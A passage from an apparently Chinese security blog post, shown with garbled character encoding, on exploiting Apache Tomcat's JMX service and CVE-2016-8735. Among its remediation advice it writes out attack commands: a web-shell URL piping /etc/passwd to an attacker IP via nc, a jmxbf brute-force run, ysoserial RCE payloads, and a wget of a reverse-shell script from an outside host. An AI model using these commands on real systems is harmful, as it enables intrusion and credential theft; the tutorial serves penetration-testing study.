                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110310.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110310.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>åŒ…æ‹¬ä¸€äº›è°ƒæ•´å…è®¸ä½¿ç”¨ç®¡é“å°†è¾“å‡ºä»ä¸€ä¸ªå‘½ä»¤é‡å®šå‘åˆ°å¦ä¸€ä¸ªå‘½ä»¤<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.11.141/docs/test.jsp?cmd=sh -c <span class="variable">$@</span>|sh . <span class="built_in">echo</span> /bin/cat /etc/passwd | nc 192.168.11.136 8080</span><br></pre></td></tr></table></figure><br>å¦‚æœéœ€è¦ç›®å‰ä¸ºæ­¢çš„web shellä¹Ÿå¯ä»¥ç”¨æ¥æ‰§è¡Œwgetå‘½ä»¤ï¼Œå¹¶ä»è¿œç¨‹æœºå™¨ä¸Šé¢ä¸‹è½½ä¸€ä¸ªæ›´å¤šåŠŸèƒ½çš„JSP shellã€‚</p>
<p><br></p>
<p>(6)æ•è·SMB challenge-responses hashes<br>ç„¶è€Œæœ‰æ—¶å¯èƒ½å‡ºç°ä¸æ­£ç¡®çš„æƒ…å†µï¼Œä¸”æœåŠ¡å™¨è¿è¡Œåœ¨åŸŸè´¦æˆ·ã€‚å¦‚æœé‚£ç§æƒ…å†µï¼Œæ•è·SMB challenge-responseså’Œç ´è§£ä»–ä»¬æ˜¯å¯èƒ½çš„ã€‚Rotateå‡½æ•°ä¹Ÿåœ¨è¿™é‡Œä½¿ç”¨ã€‚<br>ä¸ºäº†æµ‹è¯•æ”»å‡»åœºæ™¯ï¼ŒKaliè™šæ‹Ÿæœºå¯ä»¥ç”¨æ¥å¯åŠ¨Metasploit SMB capture auxiliary moduleã€‚<br>ä½¿ç”¨JConsoleæ‰§è¡ŒJMXè¿æ¥ï¼Œå¹¶ä¸”ä½¿ç”¨ä¸‹é¢çš„å‚æ•°ä½¿ç”¨rotateå‡½æ•°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\192.168.11.136\test</span><br></pre></td></tr></table></figure><br>åœ¨è¿™ç§æƒ…å†µï¼Œä¸Šé¢çš„IPåœ°å€æ˜¯Kaliè™šæ‹Ÿæœºã€‚ä¸‹é¢çš„æˆªå›¾ç¡®è®¤äº†Tomcatå‘è¿œç¨‹IPå‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼Œèƒ½å¤Ÿ3æ¬¡æ•è·SMB challengeï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110702.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110702.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>é€šè¿‡åˆ›å»ºå…¶ä»–æ–‡ä»¶ç±»å‹æ¥è¿›è¡Œclient-sideæ”»å‡»<br>æ³¨æ„ï¼Œrotateå‡½æ•°ä¹Ÿèƒ½ç”¨æ¥åˆ›å»ºæ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚HTMLæ–‡ä»¶ï¼‰ï¼Œå¹¶ä¸”åœ¨ç½‘ç»œåº”ç”¨ä¸­å­˜å‚¨ä»–ä»¬ï¼Œä»¥ä¾¿æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ã€‚<br>è¿™ä¸ªæ¶‰åŠåˆ°ï¼Œé‡å¤ä¸Šè¿°æ­¥éª¤ï¼Œä½¿ç”¨å¯é çš„HTMLä»£ç æ±¡æŸ“æ—¥å¿—æ–‡ä»¶ï¼Œç„¶ååœ¨Tomcatç½‘ç»œåº”ç”¨ç¨‹åºç›®å½•ä¸­å­˜å‚¨ä¸€ä¸ªHTMLæ–‡ä»¶ã€‚<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110709.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110709.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<p>(7)æŠ“å–ç½‘ç»œåº”ç”¨çš„ç”¨æˆ·çš„session ID<br>å¦å¤–çš„Tomcat JMXæ“ä½œèƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥åŠ«æŒTomcatç½‘ç»œåº”ç”¨çš„ç”¨æˆ·çš„ä¼šè¯ï¼ŒlisrSessionIds()åœ¨ä¸‹é¢çš„èŠ‚ç‚¹æ˜¾ç¤ºï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Catalina-&gt;Manager-&gt;[ApplicationName]-&gt;Operations-&gt;listSessionIds()</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªæ“ä½œé€šå¸¸å¯ç”¨äºTomcatä¸Šéƒ¨ç½²çš„æ¯ä¸ªç½‘ç»œåº”ç”¨ä¸­ï¼Œä¸”å¦‚åç§°æ‰€ç¤ºèƒ½è¿”å›è¿æ¥åº”ç”¨çš„ç”¨æˆ·çš„æ‰€æœ‰çš„JSESSIONIDã€‚</p>
<p>ä¾‹å¦‚ä¸‹é¢çš„æˆªå›¾æ˜¾ç¤ºäº†è¿æ¥ç®¡ç†å™¨åº”ç”¨çš„ç”¨æˆ·çš„session IDï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910110750.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910110750.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>é€šè¿‡Tomcat JMXæœåŠ¡å¯ç”¨çš„æ“ä½œä¹‹ä¸€å°†å…è®¸æ£€ç´¢JSESSIONID cookieå€¼ï¼Œå› æ­¤å¯èƒ½å…è®¸æ”»å‡»è€…é€šè¿‡åŠ«æŒä»–ä»¬çš„ä¼šè¯æ¥å‡å†’å¦ä¸€ä¸ªç”¨æˆ·ã€‚<br>æ³¨æ„ï¼Œç”±äºéœ€è¦è¯¥å¸æˆ·çš„æœ‰æ•ˆç”¨æˆ·åå’Œå¯†ç ï¼Œå› æ­¤æ— æ³•åˆ©ç”¨æ­¤é—®é¢˜è®¿é—®ç®¡ç†å™¨åº”ç”¨ç¨‹åºã€‚ç„¶è€Œéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šçš„å…¶ä»–åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚æ”¯æŒåŸºäºJSESSIONID cookieçš„è®¤è¯çš„åº”ç”¨ç¨‹åºï¼‰ä¼šå—åˆ°å½±å“ã€‚</p>
<p>èƒ½å¤Ÿè¿è¡ŒlistSessionIds()æ•°çš„æ”»å‡»è€…å°†èƒ½å¤ŸåŠ«æŒå¦ä¸€ä¸ªç”¨æˆ·çš„ä¼šè¯ï¼Œæ³¨æ„listSessionIds()æ˜¯å¦ä¸€ä¸ªæ“ä½œï¼Œå®ƒåªå¯¹å…·æœ‰å†™å…¥æƒé™çš„JMXç”¨æˆ·å¯ç”¨ã€‚<br>å¦‚æœJMXæœåŠ¡å™¨é…ç½®ä¸ºå…è®¸æœªç»è®¤è¯çš„è®¿é—®ï¼Œé‚£ä¹ˆå®ƒä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚<br><br></p>
<p>(7)æš´åŠ›ç ´è§£è¿›å…¥Tomcat JMX<br>å½“Tomcat JMXæœåŠ¡é…ç½®ä¸ºå¯ç”¨è®¤è¯å¹¶ä¸”ä½¿ç”¨å¼ºå¯†ç æ—¶ï¼Œä»æœ‰å¯èƒ½è·å¾—æœªç»æˆæƒçš„è®¿é—®ã€‚<br>å®é™…ä¸Šä¸ºæ­¤æœåŠ¡å®ç°çš„è®¤è¯è¿‡ç¨‹åœ¨ç™»å½•å¤±è´¥åä¸ä¼šé”å®šå¸æˆ·ï¼Œå› æ­¤å®¹æ˜“å—åˆ°æš´åŠ›å¯†ç ç ´è§£æ”»å‡»ã€‚<br>PoCå·¥å…·ï¼ˆjmxbfï¼‰å·²ç»ç”±ä½œè€…å¼€å‘æ¥æ¼”ç¤ºè¿™ä¸ªã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmxbf.jar</span><br><span class="line">$&gt;java â€“jar jmxbf.jar â€“h 192.168.20.1 â€“p 1099 â€“uf usernames.txt â€“pf passwords.txt</span><br><span class="line">githubå¯ä»¥ä¸‹è½½åˆ°ï¼šhttps:&#x2F;&#x2F;github.com&#x2F;nccgroup&#x2F;jmxbf</span><br></pre></td></tr></table></figure><br>æ­£å¦‚å·²ç»æåˆ°çš„ï¼ŒMBeansæ“ä½œçš„å¤§åˆ—è¡¨å’Œå±æ€§èƒ½æä¾›ç»™è¿æ¥Tomcat JMXæœåŠ¡çš„ç”¨æˆ·ä½¿ç”¨ã€‚å¯èƒ½è¿˜æœ‰å…¶ä»–å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ä¸ä¸Šé¢è®¨è®ºçš„rotateå‡½æ•°é—®é¢˜æ‰€ç¤ºçš„ç±»ä¼¼çš„æ–¹å¼ã€‚</p>
<p>å¦‚æœæš´éœ²äº†JMXæœåŠ¡å™¨å¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´ï¼šï¼ˆååºåˆ—åŒ–ï¼‰<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2016-3427Â </span><br><span class="line">http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2016-8735</span><br></pre></td></tr></table></figure><br>æ˜¯å´å¯ä»¥è¯´å¦‚æœä½ çš„Tomcatè¿è¡Œåœ¨è€ç‰ˆæœ¬çš„Javaç³»ç»Ÿä¸­ï¼Œæ˜¯å¯èƒ½é€šè¿‡å‘é€ç‰¹å®šçš„åŒ…åˆ°JMXæœåŠ¡å™¨æ¥å®ç°RCEã€‚</p>
<p><br></p>
<p>(8)ä¿®å¤å»ºè®®<br>é¦–å…ˆï¼Œå»ºè®®å¯¹JMXæœåŠ¡çš„è®¿é—®ä½¿ç”¨é˜²ç«å¢™ã€‚åªæœ‰åˆ—å…¥ç™½åå•çš„IPåœ°å€æ‰èƒ½è¿æ¥ã€‚<br>ç„¶è€Œï¼Œåº”è¯¥å§‹ç»ˆå¯ç”¨å¼ºå¯†ç çš„è®¤è¯ï¼Œä¸‹é¢æ˜¯åœ¨Windowsä½¿ç”¨setenv.batå¯åŠ¨è®¤è¯çš„ä¾‹å­ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SET JAVA_HOME&#x3D;&#123;replace with full path to Java JDK&#125;</span><br><span class="line">SET JRE_HOME&#x3D;%JAVA_HOME%</span><br><span class="line">SET JAVA_OPTS&#x3D;%JAVA_OPTS% -Xms256m -Xmx512m -XX:MaxPermSize&#x3D;256m -server</span><br><span class="line">SET CATALINA_OPTS&#x3D;-Dcom.sun.management.jmxremote </span><br><span class="line">-Dcom.sun.management.jmxremote.port&#x3D;1099 </span><br><span class="line">-Dcom.sun.management.jmxremote.rmi.port&#x3D;1099 </span><br><span class="line">-Dcom.sun.management.jmxremote.ssl&#x3D;true </span><br><span class="line">-Dcom.sun.management.jmxremote.local.only&#x3D;false </span><br><span class="line">-Djava.rmi.server.hostname&#x3D;&#123;replace with Tomcat server IP address&#125;</span><br><span class="line">SET CATALINA_OPTS&#x3D;%CATALINA_OPTS% </span><br><span class="line">-Dcom.sun.management.jmxremote.authenticate&#x3D;true </span><br><span class="line">-Dcom.sun.management.jmxremote.password.file&#x3D;%CATALINA_BASE%&#x2F;conf&#x2F;jmxremote.password </span><br><span class="line">-Dcom.sun.management.jmxremote.access.file&#x3D;%CATALINA_BASE%&#x2F;conf&#x2F;jmxremote.access</span><br></pre></td></tr></table></figure></p>
<p>ä¸‹é¢æ˜¯Linuxä¸‹é¢ä½¿ç”¨setenv.shçš„ä¾‹å­:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME=&#123;replace with full path to Java JDK&#125;</span><br><span class="line">JRE_HOME=<span class="variable">$JAVA_HOME</span></span><br><span class="line">JAVA_OPTS=<span class="string">"-Djava.awt.headless=true -XX:+UseG1GC -Dfile.encoding=UTF-8 <span class="variable">$JAVA_OPTS</span> "</span></span><br><span class="line">JAVA_OPTS=<span class="string">"-XX:MaxPermSize=256M -Xms256M -Xmx512M <span class="variable">$JAVA_OPTS</span> "</span> </span><br><span class="line">CATALINA_OPTS=<span class="string">"-Dcom.sun.management.jmxremote </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.port=1099 </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.rmi.port=1099 </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.ssl=true </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.local.only=false </span></span><br><span class="line"><span class="string">-Djava.rmi.server.hostname=&#123;replace with Tomcat server IP address&#125; </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.authenticate=true </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password </span></span><br><span class="line"><span class="string">-Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access"</span> </span><br><span class="line"><span class="built_in">export</span> JAVA_HOME</span><br><span class="line"><span class="built_in">export</span> JRE_HOME</span><br><span class="line"><span class="built_in">export</span> JAVA_OPTS</span><br><span class="line"><span class="built_in">export</span> CATALINA_OPTS</span><br></pre></td></tr></table></figure></p>
<p>SSLä¹Ÿåº”è¯¥å¼€å¯ï¼Œä»¥ä¿æŠ¤è®¤è¯è¿‡ç¨‹ä¸­å‡­æ®å—…æ¢æ”»å‡»ã€‚<br>æ³¨æ„ï¼Œåœ¨ä¸Šè¿°æ‰€æœ‰çš„é…ç½®ä¸­ï¼Œjmxremote.sslå˜é‡è®¾ä¸ºtrueã€‚</p>
<p>ä¸‹é¢çš„URLåŒ…å«äº†è¿™ä¸ªä»»åŠ¡çš„å‚è€ƒä¿¡æ¯ï¼š<br><a href="https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html" target="_blank" rel="noopener">https://db.apache.org/derby/docs/10.10/adminguide/radminjmxenablepwdssl.html</a><br><a href="https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html" target="_blank" rel="noopener">https://www.ibm.com/support/knowledgecenter/SSYMRC_6.0.1/com.ibm.jazz.repository.web.admin.doc/topics/t_server_mon_tomcat_option3.html</a><br>å¼ºçƒˆæ¨èä¸ºåªè¯»å’Œè¯»å†™ç”¨æˆ·åœ¨jmxremote.passwordæ–‡ä»¶ä¸­è®¾ç½®é«˜å¼ºåº¦å¯†ç ä¿æŠ¤ã€‚</p>
<p>å¦å¤–åªæœ‰Tomcatç”¨æˆ·æ‰è¢«å…è®¸è¯»å–jmxremote.passwordæ–‡ä»¶ï¼Œå¦‚æœæ£€æµ‹åˆ°è¿™ä¸ªæ–‡ä»¶çš„è¯»æƒé™å¤ªå®½æ¾Tomcatå°†ä¸ä¼šå¯åŠ¨ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacls jmxremote.password /P [username]:R</span><br></pre></td></tr></table></figure></p>
<p>å…³äºrotateå‡½æ•°çš„é—®é¢˜ï¼Œä½œè€…è®¤ä¸ºåº”è¯¥ä¸¥æ ¼çš„æ§åˆ¶ï¼Œä»¥é¿å…Tomcat JMXæœåŠ¡å™¨åœ¨æœåŠ¡å™¨ä¸Šå¯ç”¨çš„ä»»ä½•æ–‡ä»¶å¤¹ä¸Šåˆ›å»ºå…·æœ‰ä»»ä½•æ‰©å±•åçš„æ—¥å¿—æ–‡ä»¶ã€‚<br>é€šè¿‡è¿™ä¸ªå‡½æ•°åˆ›å»ºçš„æ—¥å¿—æ–‡ä»¶åªèƒ½åœ¨Tomcatæ—¥å¿—æ–‡ä»¶å¤¹ä¸­åˆ›å»ºï¼Œå¹¶ä¸”æ— æ³•ä½¿ç”¨URLè®¿é—®ã€‚</p>
<p>æœ€åè€ƒè™‘åœ¨ç³»ç»Ÿä¸Šå­˜å‚¨ä¸€ä¸ªå“ˆå¸Œç‰ˆæœ¬çš„Tomcatç®¡ç†å™¨å¯†ç ï¼ˆå› ä¸ºè¿™ä¸ªå“ˆå¸Œå°†åœ¨JMXå±æ€§ä¸­å¯è§ï¼‰è€Œä¸æ˜¯çº¯æ–‡æœ¬ç‰ˆæœ¬ã€‚<br>æ³¨æ„ï¼Œè¿™æ˜¯æˆ‘ä»¬ä»Tomcatæ”¶åˆ°çš„ä¸€ä¸ªå»ºè®®ï¼ŒåŒæ—¶è®¨è®ºäº†JMXåªè¯»ç”¨æˆ·èƒ½å¤Ÿè¯»å–ç®¡ç†å™¨çš„å¯†ç çš„é—®é¢˜ï¼Œç„¶è€Œè¿™ç§æƒ…å†µä¸‹å¦‚æœç”¨æˆ·åè¿˜æ˜¯æ˜æ–‡ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç¦»çº¿å¯†ç ç ´è§£å·¥å…·ç ´è§£å¯†ç ã€‚</p>
<p>ä¸‹é¢çš„URLåŒ…å«äº†å­˜å‚¨å“ˆå¸Œç‰ˆæœ¬å¯†ç çš„ä¸€äº›å‚è€ƒï¼š<br><a href="https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-8.0-doc/realm-howto.html#Digested_Passwords</a><br><a href="http://www.jdev.it/encrypting-passwords-in-tomcat/" target="_blank" rel="noopener">http://www.jdev.it/encrypting-passwords-in-tomcat/</a><br><a href="https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/" target="_blank" rel="noopener">https://leanjavaengineering.wordpress.com/2011/02/04/tomcat-digested-passwords/</a> </p>
<p>ä¸‹é¢æ˜¯digestå·¥å…·çš„ä½¿ç”¨ä¾‹å­ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">digest.bat -s 0 -i 1 themanagersecretpassword</span><br><span class="line"><span class="comment">#æ ¹æ®Tomcatçš„æ¨èï¼Œå½“ä¸ä½¿ç”¨-aå‚æ•°ï¼Œåˆ™é»˜è®¤ä½¿ç”¨SHA-512ã€‚</span></span><br><span class="line"><span class="comment">#æ³¨æ„åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ-så’Œ-iå‚æ•°åˆ†åˆ«ç”¨äºè®¾ç½®saltçš„é•¿åº¦å’Œè¿­ä»£æ¬¡æ•°ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†è¾“å‡ºæ˜æ–‡å’ŒåŠ å¯†çš„å‡­æ®ï¼š</span></span><br><span class="line">themanagersecretpassword:42052cec2459a6b4c383f2c43698d0528fe3f39756f8524763fc9e2997e77ebf1f1ba9bc0926b7395e32bb796e4ec0c1045e96c15c1edb510c2e295a5c11b095</span><br><span class="line">&gt;digest.bat themanagersecretpassword  <span class="comment">#è¿”å›&#123;salt&#125;$&#123;iterations&#125;$&#123;digest&#125;æ ¼å¼çš„è¾“å‡º</span></span><br><span class="line">themanagersecretpassword:92cd45d5db0f5794c794bf4fb0cc975347978d53673ec3c946a28c199c209995<span class="variable">$1</span><span class="variable">$a27648ca5671b33692ebb95a80720903dfd50b</span></span><br></pre></td></tr></table></figure><br><br></p>
<h4 id="0x06-CVE-2016-8735-è¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#0x06-CVE-2016-8735-è¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="0x06 CVE-2016-8735(è¿œç¨‹ä»£ç æ‰§è¡Œ)"></a>0x06 CVE-2016-8735(è¿œç¨‹ä»£ç æ‰§è¡Œ)</h4><p>æè¿°:Apache Tomcat Remote Code Execution {JmxRemoteLifecycleListener-æœ‰é™åˆ¶},Tomcatæ˜¯è¿è¡Œåœ¨Apacheä¸Šçš„åº”ç”¨æœåŠ¡å™¨ï¼Œæ”¯æŒè¿è¡ŒServlet/JSPåº”ç”¨ç¨‹åºçš„å®¹å™¨â€”â€”Tomcatå¯çœ‹ä½œæ˜¯Apacheçš„æ‰©å±•ï¼Œä¸è¿‡å®é™…ä¸ŠTomcatä¹Ÿå¯ä»¥ç‹¬ç«‹äºApacheè¿è¡Œã€‚<br>CVE ç¼–å·: CVE-2016-8735<br>æ¼æ´æ¦‚è¿°ï¼šOracleä¿®å¤äº†JmxRemoteLifecycleListenerååºåˆ—åŒ–æ¼æ´(CVE-2016-3427)ã€‚<br>Tomcatä¹Ÿä½¿ç”¨äº†JmxRemoteLifecycleListenerè¿™ä¸ªç›‘å¬å™¨,ä½†æ˜¯Tomcatå¹¶æ²¡æœ‰åŠæ—¶å‡çº§ï¼Œæ‰€ä»¥å­˜åœ¨è¿™ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
<p>å—å½±å“ç‰ˆæœ¬:</p>
<ul>
<li>Apache Tomcat 9.0.0.M1 to 9.0.0.M11</li>
<li>Apache Tomcat 8.5.0 to 8.5.6</li>
<li>Apache Tomcat 8.0.0.RC1 to 8.0.38</li>
<li>Apache Tomcat 7.0.0 to 7.0.72</li>
</ul>
<p>åˆ©ç”¨æ¡ä»¶ï¼šå¤–éƒ¨éœ€è¦å¼€å¯JmxRemoteLifecycleListenerç›‘å¬çš„10001å’Œ10002ç«¯å£ï¼Œæ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
<p>æ¼æ´PoCï¼š<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a><br>Tomcat 8.0.36ï¼Œconf/server.xmlæ·»åŠ é…ç½®ï¼Œå¿…é¡»æ·»åŠ catalina-jmx-remote.jaråŒ…ï¼Œä¿®æ”¹catalinaæ–‡ä»¶é…ç½®ï¼›</p>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112650.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112650.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112748.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112748.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#H:\å·¥å…·åŒ…\White\æ¡†æ¶æ¼æ´Structure\Javaååºåˆ—</span></span><br><span class="line">java -jar ysoserial-master.jar</span><br><span class="line">java -cp ysoserial-master-v0.0.4.jar ysoserial.exploit.RMIRegistryExploit localhost 10001 Groovy1 calc.exe</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112810.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112810.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p>é‡‡ç”¨Ceye çš„ DNSlog å›æ˜¾çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ„é€ å‘½ä»¤ï¼š</span><br><span class="line">Win ping ä¸€æ¬¡å‘½ä»¤ï¼šping -n 1 qjkpla.ceye.io</span><br><span class="line">Linux ping ä¸€æ¬¡å‘½ä»¤ï¼šping -c 1 qjkpla.ceye.io</span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112902.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112902.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910112908.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910112908.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p>é‡‡ç”¨ncåå¼¹shell: <code>nc -l -vv 12555</code><br>ç„¶åæ„é€ å‘½ä»¤ï¼šä¸‹è½½æˆ‘ä»¬çš„åå¼¹è„šæœ¬:(ä¹‹å‰ç”¨ bash å‘½ä»¤åå¼¹æ²¡æœ‰æˆåŠŸæ‰€ä»¥ä½¿ç”¨ Python è„šæœ¬è¿›è¡Œåå¼¹)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.4-all.jar ysoserial.exploit.RMIRegistryExploit æ¼æ´IP ç«¯å£ Groovy1 <span class="string">"wget http://0ke.org/back.py -O /tmp/x.py"</span></span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910113002.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910113002.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p>æˆåŠŸåå¼¹ï¼š<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190910113348.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190910113348.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>ä¿®å¤æ–¹æ¡ˆï¼š<br>å…³é—­JmxRemoteLifecycleListeneråŠŸèƒ½ï¼Œæˆ–è€…æ˜¯å¯¹jmx JmxRemoteLifecycleListenerè¿œç¨‹ç«¯å£è¿›è¡Œç½‘ç»œè®¿é—®æ§åˆ¶ï¼ŒåŒæ—¶å¢åŠ ä¸¥æ ¼çš„è®¤è¯æ–¹å¼ã€‚</p>
<p><br></p>
